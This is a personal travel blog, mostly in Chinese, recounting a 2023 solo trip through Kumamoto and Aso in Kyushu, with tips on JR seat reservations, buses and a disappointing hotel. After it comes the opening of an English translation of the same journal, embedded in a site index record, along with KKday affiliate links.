熊本車站電子機器劃位，想說有點遠、帶著行李還是劃個位。按照說明書劃位，總之就是： 先選擇語言、先選擇語言、先選擇語言 （不然插入票卡後不能改，要退出重來） 插入 JR Pass 票卡 選擇出發、到達站 (用英文站名搜尋) 選擇班次、座位 完成有問題現場都有站務人員可以問，本來有一班 15 分鐘後發車的沒位子，只能買 45 分鐘後的另一班列車。不過也還好沒買那班，從博多站內走到新幹線往鹿耳島(經熊本)的月台，大概就要 10 分鐘，要繞一下有點遠，時間太趕。趕在 JR Pass 到期最後一天用完。 本來還擔心我的 27 寸行李箱 (約 69 x 50 x 29 cm) 會不會上面行李架放不下要買 特大行李附帶席，規定是三邊和超過 160 cm 一定要買 。 27 寸放腳會太卡，也會卡到隔壁；實測放行李架蠻穩的，但仍要扛上去放，買靠窗的位子在拿放行李時又怕會卡到走道的乘客；還好遇到好心的日本阿伯願意讓位子給我拿放行李。一到熊本就看到巨大的熊本熊，先轉 JR &amp; 地鐵到飯店寄放行李(市立體育館前站)。熊本到處都是熊本熊….2024–11–16 Update：⚠️⚠️熊本縣內公共運輸： 九州產交公車、產交公車、熊本公車、熊本都市公車及熊本電鐵 ，已不在接受使用 Suica、PASMO、ICOCA 等交通系卡支付車資 ，目前只能使用現金，未來可能會導入信用卡付費，敬請注意。⚠️⚠️⚠️⚠️⚠️⚠️⚠️熊本城放好飯店後搭路上電車前往熊本城(到通町筋站)。可以先去下面的 櫻之馬場 城彩苑(忘了拍照) 逛逛補充能量，可以在此購買熊本城門票，這邊沒什麼人，上去熊本城入口買遇到團體人會很多卡成一團。門票有：熊本城 800、熊本城+買票後面那棟(歷史文化體驗 湧湧座) 850、熊本城+買票後面那棟(歷史文化體驗 湧湧座) +熊本博物館 1,100 三種我是買 熊本城+湧湧座 想說多 50 日圓而已，但去逛了一圈覺得普普，多補充了熊本城內的展覽跟地震相關文物，適合拍照體驗。熊本城天守閣 2023 年已完成修復開放，其他建築仍在維修中(可以看到吊車)。新的是直接規劃成天空步道，照著路線一路走到熊本城。上天守閣之後可以看到一路走來的天空步道。鳥瞰熊本城前方廣場與後方持續維修中的古蹟。地震之後當時的狀況模型。在廣場隔壁的伴手禮店收藏了熊本城模型，完成我的三大名城搜集任務！原路返回到 買票的地方，去逛湧湧座；裡面有熊本城模型跟一個樂高做的熊本城，很酷。因天氣不理想，就沒再往後繞道博物館、加藤神社。一路再走回通町筋站，這邊就是上通商店街與熊本本地的鶴屋百貨，百貨東棟一樓就是前幾個月才整個重新裝修好的熊本熊廣場(熊本熊部長辦公室)。在商店街亂逛剛好遇到熊本熊 x 交通安全 的公開活動，獲得一個熊本熊手提袋。這整區不算好逛，蠻無聊的；只有蔦屋書店、無印良品那棟比較好逛，熊本剛下車站就可以感受到老年人很多、年輕人很少，本地的鶴屋百貨也幾乎都是老年人、賣婦人服、居家用品居多，較少年輕人的東西。去鶴屋百貨的熊本熊周邊店買了些熊本熊(樣式比熊本廣場多)，再去百貨地下街買酒、吃的東西(晚餐+宵夜)回飯店吃。香露是店家推薦的熊本地酒，甜口的，喝起很順，但我覺得米味不夠。Green Rich飯店 - 水前寺 (Green Rich Hotel Suizenji) 2023/09值得一提的是飯店，以往其實不會特別看評價；就看差不多 3 顆星以上的就好；這間的隔音也不好又遇到整層都是國小畢業旅行，連續兩天的早晚都一直開關門碰！碰！碰！，非常地大聲擾人。查了下 Google/Agoda 上的評價明細，覺得心有戚戚焉。隔音不好應該是老舊飯店的通病，這個我還能忍(自備耳塞)；但是飯店的 WiFi 如同前人留下的評價，純粹糊弄人而已。WiFi 整間都有訊號，但是在房間內就算訊號滿格速度還是非常慢，連網頁都打不開，要貼著房門用，網路速度才會是正常的，幾乎等於飯店沒網路。 價格也很不美麗，不如都住福岡，同樣價格在福岡直升 APA 了。 經過這次經驗之後知道就算是日本飯店也還是要看一下評價的….真的除了離機場交通方便外沒優點，附近也無超商(要走 10 分鐘以上才有)。Day 6 水前寺成趣園、熊本熊廣場表演、花畑廣場、櫻町購物中心早上起來出門直接走到對面的水前寺成趣園。 KKday 參考行程：九州熊本一日遊|阿蘇中岳火山・草千里・熊本城・水前寺成趣園/季節水果吃到飽|福岡博多出發(中英日對應)水前寺成趣園(出水神社)有點板橋林家花園感，裡面整理的很乾淨、水很清澈，有小富士山、出水神社跟很肥的錦鯉還有貓。熊本熊廣場表演走完後搭乘路面地鐵到水道町前往熊本熊廣場(昨天來過)。裡面有熊本熊部長周邊可以拍照，外面有 Monitor 能看到裡面的狀況。因為距離當天表演時間 11 點還很早，先去隔壁鶴屋百貨覓食。表演時刻表可參考熊本 廣場官方網站 (時間不一定，但週六多半有三場)。路過旁邊的鶴屋百貨一樓也發現一隻心酸打工彈鋼琴的部長。去 B1 吃了當地有名的蜂樂饅頭，就是餡料很厚實的車輪餅，有分白豆、紅豆兩種餡，喜歡甜食的會很愛，配上咖啡就是一頓早餐。快 11 點時回到熊本熊廣場等待表演，現在不用抽籤，只要在表演前入場都可以，超過時間應該只能在外面看 Monitor 了，有帶小孩的話可以坐裡面。表演前會先說明秩序規則，例如：不可以拍打熊本熊、拍照不可舉過頭(會擋到後面的)、根據日本法律如果有人臉要打馬賽克、歡迎大家上傳到 SNS。表演時間約 30 分鐘，主持小姊姊會邊幫熊本熊發言(全日文)，流程大概是跟大家打招呼、講熊本的趣事、跳舞(上面這首、很洗腦)、跟不同國家的人說 Hi。(這場台灣人最多ＸＤ)。熊本熊本尊很萌，動作很大、很有趣。廣場裡面賣的周邊反而少、價格也偏高，就沒有在這邊下手。看完表演接近中午，走下通商店街吃 勝烈亭 新市街本店 ；走到商店街外為了，瞬間從兒童級升級成限制級，整排都是無料案內所(另一邊熊本銀座通也是)。超厚 Jucie 豬排飯，比較特別的是有附他們的酸菜(共用、自己夾、記得用紅色筷子)，其他跟台灣吃日式豬排一樣，會上研磨棒、芝麻給你磨醬；飯、茶、湯、高麗菜一樣免費續；一口氣吃了兩碗白飯，很滿足。花畑廣場吃飽喝足後繼續走下通商店街往花畑廣場走。剛好遇到週六廣場有活動，Food Summit 2003，整圈賣吃的，中間架一個壘台在表演日摔。買了杯氣泡酒+烤腸坐下來看表演，烤腸不香沒有台灣的好吃。吃到一半還打到台下，有點嚇人，但帶入感很強；後來實在太熱了，吃完就走了，去後面的櫻町購物中心逛百貨公司。花畑廣場，感覺每週六日都有活動，來之前可以查一下，下一週是台灣祭！櫻町購物中心頂樓有一隻熊本熊在揮手，二樓也有販賣熊本熊周邊( 我覺得是最齊全的 )。這邊也會有熊本熊表演，要參考公告時間。可以一路從外面樓梯上到頂樓找到揮手的熊本熊本尊，這棟樓下同時也是熊本客運中心，可以在二樓買票前往其他城市。樓頂有一個很大的花園、可以玩水的水池，有帶小孩可以上去玩。從裡面也能搭電扶梯上去，從三樓的敘敘苑(這家敘敘苑完全沒人)就能找到再網上的電扶梯。 個人覺得櫻町購物中心比鶴屋百貨新、好逛。櫻町購物中心出來旁邊就是熊本縣物產館，除了有熊本縣的特產外也有一些熊本熊周邊(例如：熊本熊香爐ＸＤ)。回程又走了一遍上+下通商店街。去無印買了衣服跟雜物、松本清補充藥妝(不知為何我的 Visa 在松本清都刷不過，之前在東京就被雷過，這次在熊本一樣無法刷，只能犧牲日幣現金了)。到飯店時接近傍晚，晚餐就路上 Lawson 隨便解決，早早睡準備明天去阿蘇火山！Day 7 阿蘇火山、草千里、阿蘇神社、熊本站 AMU PLAZA KUMAMOTO KKday 參考行程：【一人成團,每日出團】日本熊本一日遊|熊本城&amp;阿蘇山火山口&amp;草千里(含健康Buffet吃到飽) |福岡出發一早出門走到公車站搭往阿蘇站的客運；等車又遇熊本熊。會先經過阿蘇機場(後天就要來了 Orz)。一路上比較特別的是進阿蘇火山範圍時，車上會介紹阿蘇火山然後播放當地的山歌要你一起想像漫步在阿蘇火山草原的感覺。抵達阿蘇站，站外有 航海王烏索普 銅像可以拍照(我忘了)。可以在這邊用販賣機買阿蘇火山一日券(大概便宜個幾百日圓)跟拿時刻表，一日券只限時刻表上的三站上下車，上車要抽整理券；其他站貌似無法使用。我要搭乘 8 號路線，10:45 分上山的公車。上山車程時間：約 40 分鐘。人不算多，時間快到稍微排一下隊就上車了，看大家都有上；不過應該是山路安全考量，沒有站立的位子；另外會暈車的可能要吃暈車藥。阿蘇另外有直升機體驗行程，直接坐直升機看火山，有興趣的人可以查查。阿蘇火山Kami-komezuka一路上山，會先經過草千里再到山上總站，從山上總站再換一次公車約 10 分鐘就會到山上火山口。剛好遇到隔壁的台積電大哥一樣是獨旅(來出差的XD)，也都是第一次來阿蘇，於是一起抱團跑行程。山上總站要再換一次公車，我們懶得在排公車，選擇直接用走的上山(大約 15–20 分鐘)。走路到山上廣場，出來就是阿蘇中岳第四火山口。有旅伴拍照就不是問題了！山上很涼爽、完全不熱，充滿硫磺味，有圖三的疾病要考慮身體狀況。純走馬看花，就沒有走到阿蘇中岳火山口，上來看看就走下山了。小插曲一路上聊得太開心走下來後，沒仔細看公車方向，要發車了趕快上車結果又被載上來，只好再走一遍ＸＤ到山上總站後，這次看清楚 8 號路線公車、8 號路線公車、8 號路線公車，往山下阿蘇車站的；在草千里下車。草千里吃有名的 おか牛丼飯，人多但位置也很多，出餐快幾乎不用等。吃完走出去逛逛草千里(有點擎天岡的味道)，有騎馬體驗活動。吃完搭同班 8 號公車往阿蘇站，原路下山。阿蘇神社到阿蘇站的時候，往阿蘇神社(宮地站)的 JR 再三分鐘就要發車了，錯過要再等一小時；用跑的進站，又遇到 阿蘇是小站沒有電子支付 ，要買車票，手忙腳亂的在販賣機買完車票上車。 阿蘇站只有一個月台，直接無腦上車即可；後來發現如果時間真的來不及買票，也可以直接上，出站再補就好。宮地站出來大概要再走 20 分鐘才會到阿蘇神社(直直走就到，但有點遠)。路上又遇野生熊本熊。神社不大，一下就參拜完；神社部分也在維修中。出來後旁邊有一條小小的表參道商店街，可以買些吃的稍作休息。 感謝大哥請吃炸牛肉馬鈴薯餅。都逛完之後開始慢慢走回程，本來想說搭乘 15:47 的 JR 回熊本，但走回宮地站才知道那班是全指定席的車，無販售自由席並且已全售完，無法上車。附上時刻表，或請先查好時刻；不然就會像我們一樣只能等一小時，等下一班 16:35 的區間 JR 回熊本。時間還很久，就一起走回路上的松本清逛逛。(其實也蠻遠的，大概要 10 分鐘)。最後看一眼寧靜的阿蘇。區間車慢慢開回熊本，大概花了 1 小時 45 分才到。路線有一段是之字形，會倒車開，別擔心，沒搭錯！熊本站 AMU PLAZA KUMAMOTO回到熊本站與大哥告別，期待有緣再見。在熊本站逛新開的 AMU PLAZA KUMAMOTO 百貨公司(比櫻町購物中心更大更豐富)還有旁邊的肥後市場(賣吃的)。一樣發現很多熊本熊ＸＤ。在美食街隨便吃了晚餐宮崎雞(普通)，整棟逛了一遍後買了些宵夜、熊本產的草莓酒(試喝完不錯，準備帶回台灣) 回飯店。有一家蠻特別的店叫「BIWAN 美灣」賣台灣的食品(有看到乖乖ＸＤ)，查了一下是 台灣阿原肥皂開的 。https://kumataiwanlife.com/查資料的時候還找得一個酷網站 — https://kumataiwanlife.com/ 裡面有中文的熊本最新消息、活動、冷知識(例如： 熊本的「OK繃」叫「LIBATAPE」 )…等等今天才發現飯店的販賣機居然有賣罐裝生可樂，我在三大超商都沒找到。 它是 Suntory 跟百事一起推出的，台灣買不到，用做生啤的做法作可樂，氣泡感很足，不太有糖漿的膩，我喝一般可樂喝到後面都因為太膩倒掉，但生可樂我能喝完！酒足飯飽後，早早睡去；準備迎接最後一天的熊本(扣掉回程飛機那天)。Day 9 熊本亂晃、採購熊本逛到第三天其實挺無聊的，能去的景點早就去完了，只能盡量找一些地方去看看然後買一些紀念品、藥妝。原本預計去島原市，但路途太遠(單趟 2 小時 45 分)，加上 JR Pass 早就過期，要再花錢買長途車票，放棄；大分、由布院同樣太遠，放棄；南阿蘇村，懶得去留給下次；所以就市區亂晃跟採購了，慢慢走。熊本稻禾神社一早一樣來到通町筋，先去第一天沒去到的熊本稻禾神社加藤神社一路往後面走去加藤神社(蠻遠的大概要走 20 分鐘，有山坡路。)看到這山坡往上拐進去就是加藤神社了，也可以看到第一天從天守閣看後面在維修的地方，還有很多散落的城牆要逐一恢復。小小的，有一半也還在維修中。有一個小的熊本地震募款箱，加藤神社就沒參拜了，改投募款箱。這邊可以從後方看到熊本城。原路返回後前往熊本市役所(14 樓有免費展望台)，到加藤神社的路走起來蠻遠的，可以搭公車。 本來打算去熊本美術館、手工藝館…等等，但週一都沒開！熊本市役所熊本市役所 14 樓可以鳥瞰整個熊本是、熊本城。市役所出來再往櫻町購物中心方向走，會經過一個天橋，是一個很好的拍景地點，可以拍熊本路面地鐵。這個十字路口就是熊本銀座通，前幾天有說到這邊也都是無料案內所。櫻町購物中心回櫻町購物中心逛街，再吃一次宮崎牛配熊本產的啤酒；離開時買了一隻熊本熊大福帶回台灣做紀念(可愛)。唐吉訶德一路再從下通走到上通回到通町筋，途中順便去唐吉軻德採購(這間的免稅櫃台在二樓結帳)。買完想說先回飯店休息＋放東西。小插曲 搭路面電車遇到可愛的熊本阿公阿嬤；指著免稅品的透明袋子裡的日清泡麵說「蘇勾以捏～」，我說「Good!Good@」；然後拿出剛買的熊本熊大福跟阿嬤說「卡哇伊捏～」，他比個讚說說「咖哇伊、阿哩嘎豆」；然後我說「私は台湾人です」阿嬤好像跟我打招呼什麼的(日語太爛聽不懂，只聽得出元氣什麼的)，我意思意思回應，下車的時候也跟阿公阿嬤打招呼說掰掰。回飯店後第一次掀開窗簾，後面就是水前寺流域；其實風景不錯，晚上聽得到蟲鳴。休息片刻後下午沒什麼地方去了，就隨便找地圖上的點去晃晃。魯夫銅像先走路到熊本縣本廳前，找魯夫銅像。健軍神社再搭公車+走路到健軍神社；小神社，去的時候快關門了幾乎沒人。這邊沒有公車直達，都要走一小段(約 15 分鐘)；離開神社後繼續往「熊本動物園」方向走(約 20–30 分鐘)，找喬巴銅像。喬巴銅像在路上看到軍曹井蓋(好像是之前的活動)。在動物園門口找到喬巴銅像。 熊本動物園之前查好像蠻無聊的，就沒特別安排要進去；傍晚來人家也休園了。小插曲 在動物園門口遇到一組台灣家庭要拍照，就幫他們拍了；隔天去機場又遇到又再幫他們拍一次與飛機的合影，弟弟說我是拍照哥哥ＸＤ。看地圖再往後走有水前寺流域的江津湖公園，順路走去看看；發現 只是當地人運動的河濱公園 ，就直接搭公車回去飯店了(還是公車起站)。葦善らーめん晚上去新水前寺站的居酒屋吃飯。with 前前前同事(數字科技，後來去博客來上過 Line 新聞封面、a.k.a 博客來女神的 Irene Yu 吃飯)。還能在異地跟熟悉的人吃飯太感動了，畢竟我也自閉了好幾天(不懂日文、幾乎不講話)，最後還獲得別府伴手禮😭。吃太快，只記得手羽先好吃，也嘗試了馬肉串燒(熊本馬肉刺身有名，我不敢吃)；老闆娘很親切，但菜單都是日文，字形用翻譯軟體難辨識，只能猜ＸＤ吃完飯我用走的回飯店(約 15 分鐘) 最後漫步在熊本街頭，去 Lawson、全家買了冰跟甘酒(本來以為是清酒，結果 甘酒不是酒，是滋養消暑聖品 )。也順手買明天早上的早餐(哈密瓜麵包＋果汁)，全家的這款果肉果汁(哈密瓜、草莓…)真的好喝，我幾乎有看到就會買來喝，裡面有果肉甜甜的很好喝。Day 10 回程在日本獨自流浪 10 天了，也開始想家了、想念台灣的美食、台灣的朋友們。這間飯店唯一優點，出來對面就有機場交通車。同樣遇到實際誤點，Google Map 顯示已通過的狀況；還好有長崎的教訓與電子看板，我繼續耐心的等候，大概遲到了快 10 分鐘，車終於來了。司機會幫忙把行李箱放到客運下方的行李區，下車要記得拿就好。在路上又遇到野生熊本熊圍籬ＸＤ熊本真的到處可見熊本熊！9 點多就早早到機場(因為也沒地方想去了，晚點來也是在飯店待到晚點出門)。阿蘇熊本機場(KMJ) 很新很小，班次也不多；國際線今天就三班而已，國際線只有三個櫃檯，所有輪流使用。大約等到 10:20 才開放報到/托運，之前都搭長榮(可手提兩件)，這次搭華航才發現是手提一件，現場趕快壓縮成一件。地勤說托運完先不要走，大概在現場等個 5 ~ 10 分鐘，如果行李有問題他們會叫號碼去處理(機場太小，也沒電子看板，只能乾等)。沒問題後，往國際線出發方向出境；本來想說早早來機場逛，結果機場也沒什麼。 那時候可能真的累了，後來才知道其實有觀景平台可以看飛機，掛完行李之後其實可以去逛逛，不急著出境。 要注意 3F 吃的那些全都在「安全檢查之後」出境之前，你可以左拐到吃的地方，但回來要重新檢查；一但完成出境就沒有賣吃的，只剩免稅店。一路到出境審查幾乎都沒人，安全檢查也你一人獨享。因為沒有很餓就沒有去吃的地方了，直接出境到國際線候機室。候機室、免稅店都不大，但很新並且都有 USB 充電插座；前面說的觀景平台這邊可以看到(在 2 樓的那些人就是)。沒特別買什麼，就把 Apple Watch 的 Suica 餘額花完，投了兩瓶水蜜桃水回台灣喝。12:30 準時起飛，Bye 九州、Bye 熊本。回程的飛機比較新，電影有超級瑪利歐兄弟，看完剛好到台灣；位子也沒坐滿，爽爽的一人坐一整排！下飛機的時候發現前面的人帶了一頂安全帽，是騎機車來坐飛機嗎 🤣抵達桃園機場，回家！提領行李的時候，可能因為太早托運；等了一下才來，順便實驗了 Airtag 尋找功能，行李接近的時候有叫！回台灣又在路上看到熊本熊ＸＤ(好像是玉山銀行的新卡活動)。小補充 日本公車、路面電車 搭乘經驗 整理券(上面有號碼) = 上車時候門口會有一台小機器可以抽(類似抽號碼牌) 有的路線是一口價可能就不會有整理券 如果用電子支付 (Suica) 可以不用抽整理券，但要注意金額不能扣到負 ( 跟台灣不一樣 ) 公車電車不找零，但可以先在車上的對幣機換錢(同樣在司機投錢那邊) 多半後上前下 日本公車會等人，等人坐好才開、等人下車才開；所以到站再站起來就好，不用還沒到站就擠到前面 ( 跟台灣不一樣 ) 下車就看手上的整理券號碼跟對應的車資支付：日本旅行搭公車不用怕！巴士乘車規則說明全攻略以上就是九州 10 日獨旅自由行的整個紀錄體驗，總結/Retro 已寫在前面，感謝您的閱讀。KKday 推廣 日本 JR PASS｜九州地區鐵路周遊券｜北九州＆南九州＆全九州｜電子票 日本長崎|九州豪斯登堡門票 Huis Ten Bosch 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 福岡西鐵｜太宰府 天滿宮+柳川遊船 觀光暢遊套票｜福岡機場國際線領取 日本福岡teamLab Forest 福岡門票 — SBI 證券｜立即確認 【一人成團】日本九州一日遊｜高千穗峽＆天岩戸神社＆天安河原（含特色阿蘇赤牛烤肉套餐）｜福岡出發 九州熊本一日遊｜阿蘇中岳火山・草千里・熊本城・水前寺成趣園／季節水果吃到飽｜福岡博多出發（中英日對應） 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。[2024 Update] 九州二訪 2024 六月份二次造訪九州 (9 日 + 2 日韓國) 從韓國釜山搭乘新山茶花號郵輪入境日本博多，遊歷由布院、大分、福岡、下關、絲島、佐世保更多遊記 [遊記] 2025 韓國釜山 8 天 7 夜自由行 [遊記] 2024 山陰廣域地區(上篇) 島根 出雲 松江 鳥取 姬路 大阪 神戶 7 日獨旅自由行 [遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境 [遊記] 2023 廣島岡山 6 日自由行 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 東京 5 日自由行 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 1K+ Followers 10,248 Total Views Last Statistics Date: 2025-08-15 | 10,169 Views on Medium." }, { "title": "Travel Journal: 10-Day Solo Trip to Kyushu 2023", "url": "/posts/travel-journals/en/travel-journal-10-day-solo-trip-to-kyushu-2023-d78e0b15a08a/", "categories": "Travel Journals", "tags": "Lifestyle, Japan, Kyushu, Fukuoka, Kumamoto", "date": "2023-10-04 12:46:37 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Journal] 10-Day Solo Trip to Kyushu 2023A record of my 10-day free travel in...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Journal] 10-Day Solo Trip to Kyushu 2023A record of my 10-day free travel in Kyushu, visiting Fukuoka, Nagasaki, and Kumamoto.[2024 Update] Second Visit to Kyushu June 2024: Second Visit to Kyushu (9 days + 2 days in Korea) Entering Japan from Busan, Korea via the New Camellia cruise, exploring Yufuin, Oita, Fukuoka, Shimonoseki, Isahaya, and SaseboIntroductionAt the end of August, I officially left Pinkoi, where I had spent nearly three years. I had been contemplating leaving for a while, and in the first half of the year, I thought about taking a break to clear my mind and reassess my situation upon returning. So, I traveled with friends to “[Travel Journal] 2023 Kansai &amp; 🇯🇵 First Landing](../76d66c2e34af/)” and with colleagues to “[Travel Journal] 2023 Tokyo &amp; 🇯🇵 Second Landing](../9da2c51fa4f2/)”. However, after returning, I felt an even stronger urge to break free. With my current tasks wrapping up, I gathered the courage to step out of my comfort zone and seek new challenges!The “[Travel Journal] 9/11 Nagoya Day Trip](../7b8a0563c157/)” was purely coincidental and, as mentioned in the text, felt more like a military march than a relaxing trip.Taking advantage of this rare opportunity, I decided to explore Japan once more. My original plan was to travel with a friend who was also unemployed, following the route from 🇰🇷 Busan ➡️ 🇯🇵 Fukuoka ➡️ 🇯🇵 Kumamoto. The idea was to travel from Korea to Kumamoto, with a stop in Fukuoka via the New Camellia cruise, which would take about 12 hours overnight, effectively combining commuting and accommodation.However, my friend found a job in September, and I couldn’t find a new travel companion in time. I didn’t want to move around too much alone, so I decided to skip the 🇰🇷 Busan ➡️ 🇯🇵 Fukuoka leg and instead travel from 🇯🇵 Fukuoka ➡️ 🇯🇵 Kumamoto, returning to Fukuoka from Kumamoto.With my schedule becoming quite scattered in October and needing to start preparing for a new job, I set my departure date for the end of September (9/17–9/26).Summary / RetroAs usual, I wrote my summary and reflections at the beginning. I came across a quote in a free travel group that I really liked: “Free travel is about continuously paying tuition (in time or money) to learn; the more experiences you have, the fewer pitfalls you will encounter.”👍 The fresh cola, peach soda, FamilyMart juice drinks, and autumn plum wine were delicious! Japanese professional baseball is definitely worth watching! When buying tickets, remember to choose seats that are either in an empty row or near the aisle; cheap seats are just fine. The JR Pass may not always save you money, but it definitely did in Kyushu! I saved at least over 1,000 TWD. Traveling solo led to many interesting encounters; for example, I helped a Japanese family get souvenirs from Miyahara City, a kind foreign sister offered to take my photo, I met a Taiwanese family while cruising, walked the Aso area with a TSMC brother, and even helped a family take photos in Kumamoto, only to run into them again at the airport and help them take another photo… and so on. Kumamoto Bear’s presence can be found all over Kyushu (not just in Kumamoto). Kyushu feels very spacious, with hardly any crowds; popular restaurants and attractions rarely have lines, making it very comfortable. My Japanese improved a bit; I could understand numbers (though I still had to confirm with Google Translate to avoid mispronouncing), whether to use plastic bags, and basic phrases for checkout, such as “this,” “that’s enough,” “cash,” “credit card,” and “tax-free” (XXX お願いします). I completed writing my travel journal!👎 I had a disappointing stay this time: when booking hotels in Japan, it’s essential to check reviews, especially the low-rated ones, to see if you can accept the criticisms and check the street view to see if the area is walkable. I spent too many days in Kumamoto; two days would have sufficed, and I could have spent the other days in Oita. Also, Fukuoka is actually much closer to Kumamoto than to Nagasaki. I usually look for accommodation first and then attractions, but since Kyushu is vast, I should have identified the places I wanted to visit first and then arranged accommodation to maximize the attractions I could visit. The options, prices, and quality of accommodation in Fukuoka are significantly better than in Kumamoto. I missed the Yufuin festival (I went to Nagasaki that day); I should check for festivals on the dates I plan to visit, as everyone recommends attending them. The JR Pass can be used on the Shinkansen, but not on the “Nozomi” and “Mizuho” trains; if you take them, you need to pay an additional fare. Traveling solo and not speaking the language can be quite lonely; often, I found myself quietly enjoying solitude. Solo travel accommodations tend to be more expensive. I still rushed through attractions this time; I should have slowed down to enjoy the moment and search for good food, especially since many famous restaurants in Japan are closed after meal times. The sun in Kyushu during this season is still quite strong, so sun protection is necessary. Northern Nagasaki is average (Dutch and Chinatown), while southern Nagasaki has more unique night views.KKday Promotions [**Japan JR PASS Kyushu Area Rail Pass North Kyushu &amp; South Kyushu &amp; All Kyushu E-Ticket**](https://www.kkday.com/zh-tw/product/3494-jr-kyushu-rail-pass?cid=19365&amp;ud1=d78e0b15a08a){:target=”_blank”} [Nagasaki, Japan Huis Ten Bosch Ticket](https://www.kkday.com/zh-tw/product/3988-japan-nagasaki-huis-ten-bosch-ticket?cid=19365&amp;ud1=d78e0b15a08a){:target=”_blank”} [**Japan eSIM Card Daily High-Speed, Total Unlimited Data Plans**](https://www.kkday.com/zh-tw/product/137689-japan-high-speed-daily-unlimited-data-japanese-esim?cid=19365){:target=”_blank”} [Fukuoka Nishitetsu Dazaifu Tenmangu + Yanagawa River Cruise Sightseeing Pass Pick Up at Fukuoka Airport International Terminal](https://www.kkday.com/zh-tw/product/181754?cid=19365){:target=”_blank”} [Japan Fukuoka teamLab Forest Admission Ticket — SBI Securities Confirm Now](https://www.kkday.com/zh-tw/product/124596-teamlab-forest-fukuoka-museum-sbi-secruities-admission-ticket-japan?cid=19365){:target=”_blank”} [【One-Person Tour】One-Day Tour in Kyushu Takachiho Gorge &amp; Amano Iwato Shrine &amp; Amano Iwato Shrine (Includes Special Aso Red Beef BBQ Set) Departing from Fukuoka](https://www.kkday.com/zh-tw/product/32511-kyushu-chinese-guided-day-tour-from-fukuoka-takachiho-gorge-kamishikimi-kumanoimasu-shrine-amanoiwato-shrine?cid=19365){:target=”_blank”} [One-Day Tour in Kumamoto, Kyushu Aso Nakadake Volcano, Kusasenri, Kumamoto Castle, Suizenji Jojuen / Seasonal Fruits All-You-Can-Eat Departing from Fukuoka Hakata (Chinese and English Support)](https://www.kkday.com/zh-tw/product/38965?cid=19365){:target=”_blank”} PreparationsFlightsInitially, I considered flying into and out of Fukuoka, with a round trip to Kumamoto (which later proved to be the right choice, XD, as there aren’t many attractions in Kumamoto). I found a China Airlines flight that was cheap at $1,000 for a round trip from Fukuoka to Kumamoto, so I decided on that flight.Since I had plenty of time, I chose the most luxurious option, departing at noon and returning at noon, totaling 10 days including flight time. Outbound: 9/17 CI 116 16:40 TPE -&gt; 20:00 FUK Return: 9/26 CI 2195 (New Route on 9/26) 12:30 KMJ -&gt; 13:34 TPEPrice: $10,048Given the vastness of Kyushu, I purchased the JR Pass North Kyushu Rail Pass (5 days), thinking it would be worth it no matter how I traveled.Accommodation (9 Nights)I didn’t think too much or do much research when arranging my accommodations, as I hadn’t been to Fukuoka or Kumamoto before. I decided on a roughly equal split of 5 days in Fukuoka and 4 days in Kumamoto.Fukuoka 5 Nights — Benikea Calton Hotel Fukuoka Tenjin ( Benikea Calton Hotel Fukuoka Tenjin ) Price: $7,583, $1,516/night Transportation: From Hakata Station, you can take the Nanakuma Line subway to Watanabedori Station or take a bus for a 5-minute walk.Kumamoto 4 Nights — Green Rich Hotel Suizenji ( Green Rich Hotel Suizenji )JR Kumamoto -&gt; HotelHotel -&gt; Kumamoto AirportFinding accommodation in Kumamoto was quite challenging (not sure if it was due to TSMC’s business trips taking up all the rooms), with limited options, higher prices than Fukuoka, and older facilities. In the end, I found this relatively affordable hotel. Price: $8,157, $2,039/night Transportation: From JR Kumamoto Station, transfer to the Hohi Main Line and then take the tram to reach the hotel (at the City Sports Center Station). The return trip to the airport is also very convenient, with direct buses to Kumamoto Airport right outside.With the hotel booked, I could fill out the online entry application.ItineraryThe original plan was as follows: 9/17: Arrive in Fukuoka at 21:00, reach the hotel by 22:00, and explore the street food stalls. 9/18: Visit Nagasaki (Shinchi Chinatown/Dutch Slope/Glover Garden/Urakami Cathedral/Gunkanjima Digital Museum/Meganebashi), not all of them + Atomic Bomb Museum + Peace Park + night view from the top of Inasayama. 9/19: Day trip to Yanagawa and Dazaifu + LaLaport Fukuoka (optional). 9/20: Day trip to Mojiko and Kokura Castle + street food. 9/21: Shopping in Hakata (Fukuoka Tower, shrines, Canal City, Tenjin Underground Shopping Mall…). 9/22: Shopping in Hakata + move to Kumamoto + visit Suizenji Jojuen. 9/23: Explore Kumamoto city, visit Kumamoto Castle, and see Kumamon. 9/24: Day trip to Aso Volcano. 9/25: Shimabara Castle, Shimabara’s three Shiba Inu (very far, considering). 9/26: Depart from Kumamoto Airport at 10:00, flight back at 12:30.Go! Flight Tracker, iPhone Suica usage, Visit Japan pre-entry application… I mentioned these in previous articles, so I won’t elaborate here.This time was also quite impulsive; I bought the tickets and booked the hotel on 9/10, planned the itinerary on 9/15, and departed on 9/17!Day 1: DepartureMy flight was at 16:40, giving me plenty of time to wake up slowly and head out.After arriving at Taoyuan Airport A1 station, I opted for online check-in, completing my check-in and baggage drop-off at Taipei Main Station. This way, I could head straight to immigration at the airport without having to squeeze through the check-in counters (for online check-in information, please refer to the official website).I also placed an Airtag in my checked luggage to track its location, so I wouldn’t have to worry about losing it, and it made waiting at the baggage claim much easier.I arrived at the airport around 13:00 and wandered around after clearing immigration.I casually grabbed an overpriced yet ordinary dish of mouthwatering chicken and checked the status of my luggage; it had made it to the airport with me.After eating, it was only around 14:30, so I quickly bought a Japanese language book for some last-minute studying.Due to another flight mistakenly using the wrong runway, the entire airport had to reset; our plane circled for a long time before taking off, causing a delay of about 30 minutes. The in-flight entertainment screen was also quite small.China Airlines collaborates with Wutong to create the cutest in-flight dessert, featuring Dinotaeng’s adorable short-tailed kangaroo, and the osmanthus oolong tea was quite tasty.Due to the flight delay, we finally exited the airport around 21:00.After leaving the airport, I 